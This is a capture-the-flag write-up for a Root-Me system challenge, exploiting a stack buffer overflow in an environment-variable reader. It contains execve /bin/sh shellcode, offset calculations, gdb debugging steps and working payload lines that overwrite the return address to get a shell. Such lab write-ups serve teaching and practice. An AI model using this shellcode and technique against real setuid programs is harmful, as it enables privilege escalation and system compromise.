### S0lv3d by H4yicl3


First I download binary file with my scp-script
```
#!/bin/sh
echo "password = app-systeme-$1"
scp -P2222 app-systeme-$1@challenge02.root-me.org:./$1 ./

then ./scp [name_of_challenge]
```

I use IDA to analysis the code .
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [sp+0h] [bp-418h]@1
  char home; // [sp+200h] [bp-218h]@1
  int username; // [sp+280h] [bp-198h]@1
  int shell; // [sp+300h] [bp-118h]@1
  int path; // [sp+380h] [bp-98h]@1       //overflow path
  int *v9; // [sp+40Ch] [bp-Ch]@1	  //so we can overflow pointer v9

  v9 = &argc;
  puts("[+] Getting env...");
  GetEnv((int)&v4);
  qmemcpy(&home, &v4, 0x200u);
  printf("HOME     = %s\n", &home);
  printf("USERNAME = %s\n", &username);
  printf("SHELL    = %s\n", &shell);
  printf("PATH     = %s\n", &path);
  return 0;
}
```
see the code !! try to understand that!!
the path is at sp+0x380 and the pointer is at sp+0x40C
so we count by sp+0x40C -(sp+0x380) = 140 

the important step is create the USERNAME environtment variables
so we use
```
export USERNAME=$(echo h4yicl3)
export PATH=$(python script)
```
to modify the environtment variables

where we point to get shell? 

Now i will introduce the step to create the shell inside the environment variable
```
export hayicle=$(python -c 'print "\x90"*4+"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"')
```
the function download online here : http://pastebin.com/LZM64WGL
and the function getenv can get the address of environt ment to redirect to run this
```
./getenv hayicle ch8
hayicle will be at 0xffffd8a1
```
we get the address then write the exploit like this:
```python
padding = "A"*140
address_of_shell="\xa1\xd8\xff\xff"
print padding + address_of_shell

#create name of this script is ch8.py
```
change the PATH environtment 
```
export PATH=$(python ch8.py)
```

it doesn't work !!! nevermind!!

we try again !!
```
int path; // [sp+380h] [bp-98h]@1       //overflow path
  int *v9; // [sp+40Ch] [bp-Ch]@1         //so we can overflow pointer v9

  v9 = &argc;				//so crazy !! my mistake
  puts("[+] Getting env...");
  GetEnv((int)&v4);
  qmemcpy(&home, &v4, 0x200u);
  printf("HOME     = %s\n", &home);
  printf("USERNAME = %s\n", &username);
  printf("SHELL    = %s\n", &shell);
  printf("PATH     = %s\n", &path);
  return 0;				//so try another way !we need overflow the return address
}
```

we try to use IDA to find the distance between path and return address 
```
-00000098    path             db ? ; undefined
+00000008     r               db ? ; undefined
```
so we have 0x98+0x8=160

try it with following python script
```
export PATH=$(/usr/bin/python -c 'print "A"*160+"\x41\xd8\xff\xff"')
```
we lost again !! 
i debug with gdb-peda and find the mistake! the mistake is return of struct and it use ebp  but ebp are modified !!
what should we do !!
the address this function use is after return !!

i was tried get it with path 128 byte(not overflow)
and i have the exploit look like 
```
export PATH=$(/usr/bin/python -c 'print "A"*160+"\x41\xd8\xff\xff"+"\x10\xd2\xff\xff"')
```

and i try run it again
the result is
```
./ch8 
[+] Getting env...
$ 
```
Congratz !! GLHF!!




if you want to get more !!
try read it
!!
i try debug with gdb-peda
```
gdp-peda ch8
pdis GetEnv
b *GetEnv+6
b *GetEnv+289
r
x/2wx $ebp //the argument 2 is the return address -> i got that
c
x/180wx $esp //try to find the return address -> i got position 
		//look after ret address we have the value need to add 
		
```

that is all we need to do 

the following script i run in sever to get shell

```
export PATH=$(/usr/bin/python -c 'print "A"*160+"\x95\xfd\xff\xbf"+"\x60\xf7\xff\xbf"')
```

So critical!!
